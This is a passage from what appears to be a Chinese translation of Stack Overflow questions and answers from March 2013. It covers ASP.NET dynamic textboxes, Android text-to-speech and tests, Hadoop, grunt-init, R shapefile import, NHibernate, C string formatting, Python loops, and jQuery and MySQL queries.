客户端 DOM 结构的更改对`Page`'s`Control`树没有影响。唯一受影响的是`HttpRequest`回发期间的内容。了解有多少动态创建`input`的元素对`Request.Form`数据有贡献的一种方法是将此信息作为请求的一部分传递。这就是为什么您必须使用隐藏字段建议的原因。隐藏字段值将带回客户端输​​入的计数。每次创建新输入时都必须在 javascript 中设置它，在服务器端代码中读取它，转换为整数并在`for`循环中使用。

添加

```
<asp:HiddenField runat="server" ID="txtDynamicCount" value="0" /> 
```

到标签内的`form`标记。在行后的javascript`click`事件中`counter++;`添加

```
$("#txtDynamicCount").val(counter); 
```

在`Button1_Click`：

```
int count;
if (!int.TryParse(txtDynamicCount.Value, out count))
    count = 0;

for (int i = 1; i <= count; i++)
{
...
} 
```

与其他答案的重要区别是文本框（输入元素）不会在表单提交之间持续存在。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T18:10:37.023

您不能在客户端填充服务器控件。相反，您想从服务器填充它们。这是样本 -

![在此处输入图像描述](../Images/a968080b2e5bbe719539868ed04a16b2.png)

```
<asp:PlaceHolder runat="server" ID="PlaceHolder1"></asp:PlaceHolder>
<asp:LinkButton ID="addButton" runat="server" OnClick="btnAdd_Click">Add TextBox</asp:LinkButton>
<asp:Button ID="Button1" runat="server" Text="Button" OnClick="Button1_Click" /><br/>
Posted Results: <asp:Label ID="Label1" runat="server" Text=""></asp:Label>

private List<int> _controlIds;

private List<int> ControlIds
{
    get
    {
        if (_controlIds == null)
        {
            if (ViewState["ControlIds"] != null)
                _controlIds = (List<int>)ViewState["ControlIds"];
            else
                _controlIds = new List<int>();
        }
        return _controlIds;
    }
    set { ViewState["ControlIds"] = value; }
}

protected void Page_Load(object sender, EventArgs e)
{
    if (IsPostBack)
    {
        foreach (int id in ControlIds)
        {
            var textbox = new TextBox();
            textbox.ID = id.ToString();

            PlaceHolder1.Controls.Add(textbox);
        }
    }
}

protected void btnAdd_Click(object sender, EventArgs e)
{
    var reqs = ControlIds;
    int id = ControlIds.Count + 1;

    reqs.Add(id);
    ControlIds = reqs;

    var textbox = new TextBox();
    textbox.ID = id.ToString();

    PlaceHolder1.Controls.Add(textbox);
}

protected void Button1_Click(object sender, EventArgs e)
{
    var ids = ControlIds;
    foreach (var id in ids)
    {
        var textbox = (TextBox)PlaceHolder1.FindControl(id.ToString());
        Label1.Text += textbox.Text + ", ";
    }
} 
```

# android - 如何在 Android 的蓝牙上播放文字转语音？

> ID：15392457
> 
> 赞同：2
> 
> 时间：2013-03-13T17:35:56.887
> 
> 标签：android, text-to-speech, android-audiomanager, bluetooth-sco

我是安卓新手。我创建了一个可以使用 Android Text-To-Speech 读取传入消息的应用程序。到目前为止，它很好。现在用户想要它必须通过配对的蓝牙播放。

我已经阅读了所有的论坛，但我没有得到它。现在我如何在蓝牙上播放我的 TTS 引擎？

有人知道吗？

提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-13T17:58:56.230

[在Using the Android RecognizerIntent with a bluetooth 耳机](https://stackoverflow.com/questions/14991158/using-the-android-recognizerintent-with-a-bluetooth-headset/14993590#14993590)中使用我的答案

并创建一个如下所示的说话方法

```
protected void speak(String text)
{

    HashMap<String, String> myHashRender = new HashMap<String, String>();

    if (mBluetoothHelper.isOnHeadsetSco())
    {
        myHashRender.put(TextToSpeech.Engine.KEY_PARAM_STREAM, 
                String.valueOf(AudioManager.STREAM_VOICE_CALL));
    }
    mTts.speak(text, TextToSpeech.QUEUE_FLUSH, myHashRender);
} 
```

# eclipse - 使用运行对话框 (F11) 在 Eclipse 中的远程集群上启动 Hadoop Map Reduce 作业

> ID：15392459
> 
> 赞同：1
> 
> 时间：2013-03-13T17:36:05.800
> 
> 标签：eclipse, hadoop, spring-data, sts-springsourcetoolsuite

*是否可以使用 Eclipse运行对话框*(F11)在远程集群上启动 Map Reduce 作业？

目前我必须使用*外部工具链对话框*和 Maven 运行它。

**注意：在本地集群上执行它与***Run Dialog*没什么大不了的。但是对于远程连接，必须有一个已编译的 JAR。否则你会得到一个`ClassNotFoundException`（如果`Jar-By-Class`设置了）

我们当前的设置是：

*   Spring-Data-Hadoop 1.0.0
*   STS - Springsource 工具套件
*   马文
*   CDH4

这是我们设置的`applicationContext.xml`（这是您在 vanilla hadoop 的 *-site.xml 中指定的内容）

```
 <hdp:configuration id="hadoopConfiguration">
    fs.defaultFS=hdfs://carolin.ixcloud.net:8020
    mapred.job.tracker=michaela.ixcloud.net:8021
</hdp:configuration> 
```

有没有办法告诉 Eclipse 在执行*运行对话框*时它应该构建一个 JAR 。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-14T07:33:29.963

我不知道它是否构建了一个新的 jar（可能是你必须将一个 jar 提取到一个文件夹中），添加“Run Configurations->Classpath”你的 jar 会清除问题“ClassNotFoundException”。

# download - 使用 TideSDK 下载链接

> ID：15392460
> 
> 赞同：1
> 
> 时间：2013-03-13T17:36:10.353
> 
> 标签：download, hyperlink, tidesdk

我已经看到几篇接近解决我的问题的帖子，但我仍然无法完成我的简单任务，即：

想象一下，我有一个窗口，其中包含一个远程文件的链接（通常是一个 zip 文件）。如何构建和调用访问文件并打开“另存为”对话框的函数，以便用户可以选择保存下载文件的位置？如果能够将其他链接中的不同变量传递给同一个函数，从而为其他可下载文件完成同样的事情，那就太好了。

是的，我对 TideSDK 完全陌生，而不是完全是 javascript 专家，如果这会导致前额的痛苦拍打。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-14T02:46:57.130

尝试这个。

任何带有“另存为”类的链接都会触发“另存为”对话框。该文件将在用户选择位置、命名并单击“保存”后保存。这确实使用 jquery。

```
<a href="http://wordpress.org/latest.zip" class="save-as">Download WordPress</a>    

    <script>

        $(function(){
            var currentLink;
            $('.save-as').click(function() { 
                var link = $(this).attr('href');
                var filename = link.substring(link.lastIndexOf('/')+1);
                currentLink = link;
                Ti.UI.currentWindow.openSaveAsDialog(saveComplete, {
                    title: 'Save As...',
                    multiple: false,
                    defaultName : filename
                });
                return false;
            }); // End save as.

            var saveComplete = function(results) {
                if(results.length>0) {
                    var downloadFile = results[0];
                    console.log("Download the file");
                    var httpClient = Ti.Network.createHTTPClient();
                    httpClient.open('GET', currentLink);
                    httpClient.receive(function(data) {
                      var file = Ti.Filesystem.getFile(downloadFile);
                      var fileStream = file.open(Ti.Filesystem.MODE_APPEND);
                      fileStream.write(data);
                      fileStream.close();
                    });
                }
            };

        });

    </script> 
```

# android - Android Junit 测试冻结

> ID：15392461
> 
> 赞同：2
> 
> 时间：2013-03-13T17:36:13.203
> 
> 标签：android, junit, test-suite

我有一个我正在单元测试的 android 应用程序。我有 4 个测试类，每个测试类都有多种测试方法。我从一个测试套件同时运行它们。我在模拟器上遇到了一个问题，测试会在运行测试的过程中冻结。我改用实际设备，问题就消失了。

快进几个星期，在我的设备上运行测试时我没有遇到同样的问题。过去几天我一直在谷歌上试图找到解决方案，但我发现没有任何帮助。

**问题**
当我尝试运行所有测试时，测试最终会冻结。冻结是指测试本身冻结。我看到了一种解决方案，它可能是电话或日食。我重新启动了手机，更新了 eclipse 中的所有内容，包括 eclipse 本身。我尝试更改视图以查看日食视图是否不刷新，但这些都没有帮助。我还尝试使用 junit v4 库而不是 v3。

如果我单独运行测试方法，它们都会运行并通过。只有当我从测试套件中运行它们时，它们才会失败。

**我检查了日志**
，这就是我得到的：
`03-13 12:11:04.526: I/TestRunner(23175): started: testCheckShowDialogEnabled(com.package.name.MainActivityTest)`

之后，日志中就没有其他内容了。

**在设备**
上 应用程序已完成并从屏幕上删除。它没有在下一次测试开始时再次重新打开。

**代码**
这里是我认为可能相关的代码。如果您需要更多代码，请告诉我。

```
public class AllTests extends TestSuite {
    public static Test suite() {
        TestSuite suite = new TestSuite();

        suite.addTestSuite(MainActivityTest.class);
        suite.addTestSuite(DatabaseHandlerTest.class);
        suite.addTestSuite(ClassOneTest.class);
        suite.addTestSuite(AnotherActivityTest.class);

        return suite;
    }
}

public class MainActivityTest extends ActivityInstrumentationTestCase2<MainActivity> {

    public MainActivityTest() {
        super("com.package.name", MainActivity.class);
    }

    @Override
    public void setUp() throws Exception {
        super.setUp();

        mMainActivity = getActivity();
        mSolo = new Solo(getInstrumentation(), mMainActivity);
    }

    @Override
    protected void tearDown() throws Exception {
        super.tearDown();

        mMainActivity = null;
    }
    // all the test methods
} 
```

我所有的测试类都实现了`setup()`类似`tearDown()`的。

有谁知道为什么我的测试一直冻结？非常感谢任何帮助或建议。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-13T20:08:25.243

@smk 为我指明了寻找解决方案的方向。我只是把我的改成`tearDown()`这样：

```
@Override
protected void tearDown() throws Exception {
    mSolo.finishOpenActivities();
    super.tearDown();
} 
```

现在效果很好！

# android - 应用内电池使用情况

> ID：15392464
> 
> 赞同：0
> 
> 时间：2013-03-13T17:36:20.543
> 
> 标签：android, performance, battery

有什么方法可以确定应用程序中的耗电量是什么？根据我的发现，我能得到的最细粒度的是应用程序本身使用了多少电量。我想知道我可以做些什么以尽可能以最经验的方式使我的应用程序更高效，因为当有数字支持时很容易证明更改是合理的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T20:34:01.397

> 有什么方法可以确定应用程序中的耗电量是什么？

您可以购买 Qualcomm MDP 设备并使用 Trepn 对您的应用进行相当准确和详细的功耗分析。但是，MDP 很昂贵。

否则，您几乎无能为力，仅仅是因为当前的 Android 生产硬件无法尝试收集此级别的信息。甚至设置中的电池屏幕也大多只是一个有根据的猜测。

# javascript - grunt-init：如何复制或创建一个空目录？

> ID：15392465
> 
> 赞同：3
> 
> 时间：2013-03-13T17:36:22.177
> 
> 标签：javascript, node.js, gruntjs

我想将一个空目录从我的根文件夹复制到新的初始化项目中。我想这样做，为新项目提供初始目录结构。

我在文件夹“my-template/root/”中有这样的空目录，但不会被复制：

```
 // Files to copy (and process).
    var files = init.filesToCopy(props);

    // Actually copy (and process) files.
    init.copyAndProcess(files, props); 
```

我试过这个：

```
 // to copy also the empty directories
    init.copy('myDir1/');
    init.copy('myDir2/'); 
```

但比 grunt-init 崩溃：

```
Error: Unable to read "grunt-init-example/root/myDir1/" file (Error code: EISDIR). 
```

我该怎么做才能获得一个空目录到目标文件夹？

我使用 grunt@0.4.0 和 grunt-init@0.2.0。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-14T08:34:21.413

受 Nick Mitchinson 的回答启发，我使用了这个解决方法：

```
// module dependencies
var join = require("path").join;
// empty directories will not be copied, so we need to create them manual
grunt.file.mkdir( join(init.destpath(), 'myDir1') );
grunt.file.mkdir( join(init.destpath(), 'myDir2') ); 
```

**更新：**

替代解决方案是将`.gitkeep`文件添加到空目录。目录不再为空，并将与 filesToCopy() 一起列出。

有关`.gitkeep`查看此处的更多详细信息：[https ://stackoverflow.com/a/7229996/496587](https://stackoverflow.com/a/7229996/496587)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-13T17:53:04.550

试着看看[这篇文章](http://iambot.net/building-a-javascript-project-using-node-dot-js-and-grunt.html)

与创建目录相关的部分是：

```
var root = path.normalize(__dirname+"/relative/path/you/want");
grunt.file.mkdir(root); 
```

但是，阅读整个这可能会很好。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-11-25T01:46:06.253

我在要复制的空文件夹中创建了一个空的**__empty_file.txt文件。**在我的 template.js 文件中，我执行以下操作：

1.  ***通过将init.filesToCopy(props)***返回的文件对象迭代到数组来存储与我们的 ( **__empty_file.txt ) 匹配的文件。**
**   **使用grunt.file.mkdir**为上述数组中的每个项目创建目录，并从**init.filesToCopy**返回的文件引用中删除此文件。这必须在调用**init.copyAndProcess**之前调用。*

# r - R中带有PBSmapping包的importShapefile错误

> ID：15392469
> 
> 赞同：2
> 
> 时间：2013-03-13T17:36:29.277
> 
> 标签：r, gis, shapefile, polygons

我在 RStudio（0.97.318）中的 PBSmapping（版本 2.63.37）中收到一条带有 importShapefile 的零星错误消息，运行 R 版本 2.15.2，平台：i386-w64-mingw32/i386（32 位）。我在运行以前版本的 R 和 RStudio 时也收到了错误。

```
> ST6 = importShapefile("Data/pvi_stat_2002_utm.shp", projection="UTM", readDBF = TRUE)
Error in 1:nrow(dbf) : argument of length 0

> traceback()
2: cbind(1:nrow(dbf), dbf)
1: importShapefile("Data/pvi_stat_2002_utm.shp", projection = "UTM",readDBF = TRUE) 
```

我只是偶尔会收到这个错误——可能每 10 次运行代码就有 1 次。但是一旦在会话中发生错误，它就会重复发生并且直到我完全关闭R并重新打开它之后才能成功执行命令。有一次我不得不重新启动计算机才能工作，因为连续重新打开 R 并没有帮助。

我认为这可能是内存问题，但有时当工作区中没有对象时我会收到错误消息。即使我加载了大对象，通常代码也能正常运行。为了响应该错误，我已从工作区中删除了所有对象，甚至还使用了 gc()，但无济于事。

这是我收到错误的唯一 shapefile，但由于它是我唯一经常使用的 shapefile，而且由于我无法预测错误何时发生，因此我对其他 shapefile 的努力尚无定论。不确定将 shapefile 上传到 Stack Overflow。压缩文件约为 9MB。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-13T17:59:27.257

查看 shapefile 所在的文件夹。真的有`.dbf`文件吗？如果有，听起来它是空的、已损坏或名称错误。您是否希望您的 shapefile 具有带有属性的多边形。你能试试`importShapefile(... readDBF = FALSE )`吗？也许您可以通过保管箱链接或其他方式提供我们的数据？

或者你有没有试过`rgdal:::readOGR`，或者，我个人最喜欢的，`maptools:::readShapePoly()`. 我个人发现`readShapePoly()`它非常健壮，并且有一些方法可以强制`SpatialPolygonsDataFrame`从PBS`sp`到 a 。`PolySet`

如果您真的必须使用 PBS，您是否尝试过...

```
require( maptools )
require( sp )
myshp <- readShapePoly("Data/pvi_stat_2002_utm")
myshpPBS <- SpatialPolygons2PolySet( myshp ) 
```

我假设`.prj`您的 shapefile 中有一个文件，描述了投影信息？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-07-25T11:35:29.333

我正在使用 R-3.0.1 和 PBS Mapping 2.66.53 以及来自[http://www.nafo.int/about/overview/gis/Divisions.zip](http://www.nafo.int/about/overview/gis/Divisions.zip)的 NAVO Divisions shapefile 。在 Windows 7 x86_64 和 OS X Snow Leopard（使用为 x86_64 构建的 macports R）上，.dbf 被正确读取，但使用 RHEL 5.9 有时会失败：

```
> library("PBSmapping", lib.loc="/home/gwhite/R/x86_64-unknown-linux-gnu-library/3.0")

-----------------------------------------------------------
PBS Mapping 2.66.53 -- Copyright (C) 2003-2013 Fisheries and Oceans Canada

[...]
-----------------------------------------------------------

> library("rgeos", lib.loc="/home/gwhite/R/x86_64-unknown-linux-gnu-library/3.0")
 rgeos version: 0.2-19, (SVN revision 394)
 GEOS runtime version: 3.3.8-CAPI-1.7.8 
 Polygon checking: TRUE 

> layer='Divisions'
> divs = importShapefile(layer, projection='LL')
Error in 1:nrow(dbf) : argument of length 0 
```

使用`readDBF=F`确实允许读取 shapefile 数据：

```
> divs = importShapefile(layer, projection='LL', readDBF=F) 
```

到目前为止，`importShapefile()`一直在新开始的 R 会话中工作。

# php - 按字母顺序按值对多维数组进行排序

> ID：15392475
> 
> 赞同：0
> 
> 时间：2013-03-13T17:37:02.480
> 
> 标签：php, arrays, multidimensional-array

我需要按字母顺序对数组进行排序，所以结果应该是这样的：

```
Inn Zoo
Leo Ann
Leo Zes
Sun Yog 
```

我查看了所有这些示例，但不适用于下面的数组（较早的问题）：

*   [数组按 DESC 顺序排序](https://stackoverflow.com/questions/13251045/array-sorting-in-desc-order)
*   [在不知道现有维度的情况下动态排序数组](https://stackoverflow.com/questions/13360416/sorting-an-array-dynamically-without-knowing-existing-dimensions)
*   [按字母顺序对数组进行排序php](https://stackoverflow.com/questions/1673259/sort-array-by-value-alphabetically-php)
*   [PHP：如何按字母顺序对数组的值进行排序？](https://stackoverflow.com/questions/2080301/php-how-to-sort-values-of-an-array-in-alphabetical-order)

* * *

```
Array
(
    [1] => Array
        (
            [Inn] => Array
                (
                    [Zoo] => Inn Zoo
                )

        )

    [2] => Array
        (
            [Sun] => Array
                (
                    [Yog] => Sun Yog
                )

        )

    [3] => Array
        (
            [Leo] => Array
                (
                    [Zes] => Leo Zes
                )

        )
    [4] => Array
        (
            [Leo] => Array
                (
                    [Ann] => Leo Ann
                )

        )
) 
```

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-03-13T17:56:26.540

```
array
(
    [0] => Inn|Zoo|Inn Zoo
    [1] => Sunn|Yog|Sun Yog
    [2] => Leo|Zes|Leo Ann
    [3] => Leo|Ann|Leo Zes
)

asort($list);

array
(
    [0] => Inn|Zoo|Inn Zoo
    [3] => Leo|Ann|Leo Zes
    [2] => Leo|Zes|Leo Ann
    [1] => Sunn|Yog|Sun Yog
) 
```

# ios - 如何将 iOS 中点的地理围栏列表更新到后台

> ID：15392477
> 
> 赞同：0
> 
> 时间：2013-03-13T17:37:06.100
> 
> 标签：ios, notifications, push, geofencing

我会创建一个带有地理围栏的 iOS 应用程序。

我可以通过后台 Apple 服务器向该应用程序发送新的地理围栏点列表，还是必须启动该应用程序以更新其点列表？更容易的是，我可以从外部服务器更改地理围栏点而不启动应用程序吗？

非常感谢你。

此致

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T18:13:11.623

假设您的应用程序不使用任何可用的后台模式，则您无法远程更改它们。推送通知由操作系统接收并显示，只有打开它们才会触发您的应用程序加载和执行您的代码。

# sql - NHibernate：映射到对象的非规范化 SQL 查询

> ID：15392482
> 
> 赞同：1
> 
> 时间：2013-03-13T17:37:18.400
> 
> 标签：sql, nhibernate, denormalized

我有这堂课：

```
public Customer
{
   public int CustomerId {get;set;}
   ....
   public List<Order> OrderList {get;set;}
} 
```

我想使用 NHibernate CreateSQLQuery 编写这个 SQL 查询

```
SELECT C.CustomerId, .... O.OrderId, O.OrderDate, O.OrderTotal.....
FROM Customers C
    LEFT OUTER JOIN Orders O ON C.CustomerID = O.CustomerID 
```

我如何使这种转换工作：

```
 .SetResultTransformer(Transformers.AliasToBean<Customer>()) 
```

它是否包含每个客户对象中的订单列表？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-14T11:04:33.027

如果可以，请使用命名查询。

```
<sql-query name="myQuery">
  <return alias="c" class="Customer" />
  <return-join alias="o" property="c.Orders" />
  <![CDATA[
   SELECT {c.*}, {o.*} FROM Customers c LEFT OUTER JOIN Orders o ON c.CustomerId = o.CustomerId
  ]]>
</sql-query> 
```

和被 NHibernate 理解并在会话构建时替换为实际列`{c.*}`。`{o.*}`另一个优点是您可以在应用程序启动时预编译这些查询。

```
 var results = session.GetNamedQuery("myQuery").List<Customer>(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-14T09:15:09.680

假设结果映射的所有列名都映射到实体的属性名，您可以尝试：

```
var myQuery = @"SELECT C.CustomerId, .... O.OrderId, O.OrderDate, O.OrderTotal.....
                   FROM Customers C
                   LEFT OUTER JOIN Orders O ON C.CustomerID = O.CustomerID";

myNHSession.CreateSQLQuery(myQuery)
           .AddEntity("C",typeof(Customer))
           .AddJoin("O","C.OrderList")
           .List(); 
```

希望这会有所帮助

# c# - 为什么 C#、Java 等面向对象语言中的 ValueTypes

> ID：15392483
> 
> 赞同：3
> 
> 时间：2013-03-13T17:37:20.320
> 
> 标签：c#, java, oop

嗨，我只是想知道为什么 C# 或 Java 中有**值类型**。为什么它们都不是**引用类型**？我可以看到我自己的两个原因：1）性能：所有常用的数据类型都是值类型，因为值类型有单轮，而引用类型有两轮，首先是堆栈，然后是堆。所以性能可能是原因。2）分配价值。任何帮助都将受到高度重视。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T17:42:16.360

部分原因是性能，但更大的原因是由此产生的行为。您倾向于将整数（例如）视为不可变的值类型。但是，如果您正在处理一个对象，如果因为您正在修改副本而没有在调用方法中维护更新该对象中的字段，您会感到惊讶。

# c - 从 C 中的多个整数制作字符串（char*）

> ID：15392485
> 
> 赞同：0
> 
> 时间：2013-03-13T17:37:21.247
> 
> 标签：c, string, char

我想做的是制作一个由 4 个整数组成的字符串，中间有空格。就像在 Java 中一样：

```
String res = num1 + " " + num2 + " " + num3 + " " + num4; 
```

但是我不知道如何在C中做到这一点。

```
int numWords = 0;
int numLines = 0;
int numChars = 0;
int numBytes = strlen(string);
char *result = malloc(sizeof(char) * 10);
result += numWords; //doesnt work is there somekind of function in c to do this? 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-13T17:39:42.400

您可以使用`sprintf`将每个数字转换为字符串（并`strcat`在必要时将它们一个接一个地放置）。您应该跟踪字符串的长度以确保不会溢出它。

例如：

```
int var = 10;
char buf[20];
sprintf(buf, "%d", var);  // buf string now holds the text 10 
```

如果你有一个固定的格式和数量，你不需要让它比这更复杂。所以如果你总是需要在四个数字之间留一个空格，你可以用一个`sprintf`和一个格式字符串来完成这一切`"%d %d %d %d"`（尽管这需要一个更大的字符数组）。

* * *

编写一个添加到现有字符串的小型实用程序函数很容易，例如：

```
int add_to_string(char *buf, size_t sz, int num)
{
   char tmp[20];
   sprintf(tmp, " %d", num);

   size_t len = strlen(tmp) + strlen(buf) + 1; 
   if (len > sz)
      return -1;

   strcat(buf, tmp);
   return 0;
} 
```

你会打电话给类似的东西：

```
char buf[100];
sprintf(buf, "%d", 42);
add_to_string(buf, sizeof(buf), 9);
add_to_string(buf, sizeof(buf), 15);
add_to_string(buf, sizeof(buf), 8492);
add_to_string(buf, sizeof(buf), 35);
printf("String is '%s'\n", buf);

Output:
String is '42 9 15 8492 35' 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T17:45:07.430

```
#define FMT_STR "%d %d %d %d"

char *make_string(int num1, int num2, int num3, int num4)
{
    char *res;
    int len;

    // compute the length
    len = snprintf(NULL, 0, FMT_STR, num1, num2, num3, num4) + 1;
    // allocate and use the buffer
    res = malloc(len);
    snprintf(res, len, FMT_STR, num1, num2, num3, num4);

    return res;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-13T17:55:40.993

使用`sprintf`：

```
char target[SOME_SIZE];
...
sprintf(target, "%d %d %d %d", num1, num2, num3, num4); 
```

您必须确保您的目标足够大以容纳所有四个数字的字符串表示形式，加上三个空格，加上任何符号，再加上 0 终止符。表示一个十进制数字需要 3.3 位，因此 32 位`int`最多可以有 10 个十进制数字。

如果你想动态分配目标缓冲区，你会做类似的事情

```
size_t maxdigits = (size_t) ceil((sizeof num1 * CHAR_BIT) / 3.3);
char *target = malloc( sizeof *target * ((4 * maxdigits) + 3 + 4 + 1)); 
```

空格 +3，任何符号字符 ( `+`/ `-`) +4， 0 终止符 +1。

# python - 在满足要求时撤消功能

> ID：15392487
> 
> 赞同：1
> 
> 时间：2013-03-13T17:37:25.013
> 
> 标签：python, python-2.7

我正在尝试做的是从变量“FGlasgow”中获取食物并将其添加到变量“食物”中，这很好而且简单，但我注意到即使 FGlasgow 变为负数，脚本仍然需要更多，所以我告诉脚本如果Glasgow < 0 添加食物并取一个随机数，问题是这是否可以缩短，以及我的方法是否正确。

```
import random

def RandomNo():
    Random = random.randint(0,50)
    return Random

Food = 1
FGlasgow = 100

while True:
    Random = RandomNo()
    Food += Random
    FGlasgow -= Random
    while FGlasgow < 0:
        Food -= Random
        FGlasgow += Random
        Random = RandomNo()
        Food += Random
        FGlasgow -= Random
    print "You have found" , Random , "units of food" 
```

感谢您的帮助:)任何建议都会很棒:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T18:02:47.573

你会看到我改变了变量名。它们已根据[PEP-8](http://www.python.org/dev/peps/pep-0008/#naming-conventions)进行了更改。

至于你的代码，是的，它可以缩短。您不需要外部 while 循环。此外，如果您想确保您的`f_glasgow`值不低于 0，请执行以下操作：

```
import random

def randomNo(limit):
    return random.randint(0,min(50,limit))

food = 1
f_glasgow = 100

while f_glasgow >= 0:
    x = randomNo(f_glasgow)
    food += x
    f_glasgow -= x
print "You have found" , food , "units of food" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T17:41:42.153

为什么不跳过第一个 while 循环？另外，我很困惑你为什么要进行第二次随机计算。这不能潜在地否定第一个吗？为什么不简单地做：

```
def RandomNo():
    Random = random.randint(0,FGlasgow)
    return Random

if (FGlasgow > 0):
    Random = RandomNo()
    Food += Random
    FGlasgow -= Random 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-13T17:41:54.633

`FGlasgow`只有当`Random`大于时才会变为负数`FGlasgow`，所以如果你想防止这种情况发生，只需修改你使用的参数，`randint()`这样你就不会得到任何高于`FGlasgow`：

```
import random

def RandomNo(upper=50):
    Random = random.randint(1, min(50, upper))
    return Random

Food = 1
FGlasgow = 100

while FGlasgow > 0:
    Random = RandomNo(FGlasgow)
    Food += Random
    FGlasgow -= Random
    print "You have found" , Random , "units of food" 
```

请注意，在您的代码和我的代码中最终`FGlasgow`都会达到 0，您的代码将陷入无限循环，这就是我将`while`条件更改为最终停止的原因。

# jquery - 在鼠标单击时使用 JQuery 从表中获取数据

> ID：15392489
> 
> 赞同：-1
> 
> 时间：2013-03-13T17:37:30.030
> 
> 标签：jquery

我有一个页面，其中有一个使用 CodeIgniter 的表类生成的表。现在可以`<td>`通过使用 JQuery 单击标签来获取标签的内容。例如我的表是这样的：

```
<table>
<th>ID</th><th>Name</th><th>Age</th>
<tr><td>25</td><td>Jack</td><td>15</td></tr>
<tr><td>20</td><td>Jill</td><td>16</td></tr>
</table> 
```

单击时如何获取标签内的内容（文本）？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-13T17:39:12.180

```
$('table td').click(function() { 
    var text = $(this).text(); 
}); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-13T17:39:20.377

用这个：

```
$("table td").click(function(){
    alert($(this).text());
}); 
```

或者：

```
$("table td").click(function(){
    alert(this.innerText);
}); 
```

[小提琴](http://jsfiddle.net/akcSY/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-13T17:47:41.407

我更喜欢使用链接，它更用户友好：

html:

```
...
<tr>
    <td><a href="#">25</a></td>
    <td><a href="#">Jack</a></td>
    <td><a href="#"15</a></td>
</tr>
... 
```

javascript:

```
$('a').click(function(event) {
    event.preventDefault();
    var text = $(this).text(); 
}); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-13T17:44:58.213

你可以这样做...

JS：

```
$('table td').click(function() {
var mvalue = $(this).text(); /*you can store in in a variable and use it for something else later*/
alert(mvalue); /*this provides a popup on top of the screen*/
console.log(mvalue); /*this shows you the value in your web console in case you are debugging*/
}); 
```

查看我的[小提琴](http://jsfiddle.net/blackhawx/d6qys/2/)进行演示

# javascript - Hashchange html 提交

> ID：15392490
> 
> 赞同：0
> 
> 时间：2013-03-13T17:37:30.740
> 
> 标签：javascript, jquery, html

我的脚本有问题。如果我用空格键输入一些东西，即：**google map**它会在输入框中改变：**google+map**我不喜欢什么。另外...当我再次提交时，它变得更加糟糕

```
<form name="input" action="" method="get">
Search: <input type="text" name="search">
<input type="submit" value="Submit">
  <div id="result"></div>
</form> 
```

--

```
$('form').submit(function() {
    var form_data = ($(this).serialize());
    window.location.hash = form_data.replace('=','/');
    return false;
});

$(window).on('hashchange', function () {
    var values = window.location.hash.slice(1).split('/');
    $("[name=" + values[0] + "]").val(values[1]);
});

var values = window.location.hash.slice(1).split('/');
$("[name=" + values[0] + "]").val(values[1]); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T17:40:26.990

您需要使用[decodeURIComponent](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/decodeURIComponent)从散列中转义值：

```
$('form').submit(function() {
    var form_data = ($(this).serialize());
    window.location.hash = form_data.replace('=','/');
    return false;
});

$(window).on('hashchange', updateVal);

updateVal();

function updateVal() {
   var values = window.location.hash.slice(1).split('/');
   $("[name=" + values[0] + "]").val(decodeURIComponent(values[1]));
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T17:51:04.677

在这种情况下，`<form name="input" action="" method="get">`不应使用 FORM 方法“GET”。根据[此处的 W3 推荐](http://www.w3.org/2001/tag/doc/whenToUseGet.html#examples)

> 1.3 选择 HTTP GET 或 POST 的快速清单
> 
> 在以下情况下使用 GET：交互更像是一个问题（即，它是一种安全操作，例如查询、读取操作或查找）。在以下情况下使用 POST：交互更像是订单，或者交互以用户感知的方式改变资源的状态（例如，订阅服务），或者用户对结果负责相互作用。

在 GET 中，数据是在 URI 中发送的，而 URI 中没有`spaces`，因此存在问题。

但是，如果您需要为此使用 GET 请求，则使用 decodeURIComponent`decodeURIComponent(values[1])`来转义该值

# mysql - SQL 喜欢在 concatted 字段上？

> ID：15392495
> 
> 赞同：0
> 
> 时间：2013-03-13T17:37:44.537
> 
> 标签：mysql, sql, concat

在 mysql 中是否可以在连接字段上进行选择和搜索？

```
This is example: SELECT concat(members.name, " " ,members.surname) AS i FROM members where i LIKE '%string%' 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-13T17:43:09.180

您不能在 select 子句中为列加上别名，然后在 where 子句中使用它。

但是有很多方法可以做你想做的事情。

最接近的解决方案是使用`HAVING`而不是`WHERE`：

```
SELECT concat(members.name, " " ,members.surname) AS i 
FROM members 
HAVING i LIKE '%string%' 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T17:39:10.563

只需将 concat 添加到 WHERE

```
SELECT concat(members.name, " ", members.surname) as i FROM members WHERE concat(members.name, " ", members.surname) LIKE '%somestring%' 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-13T17:39:58.573

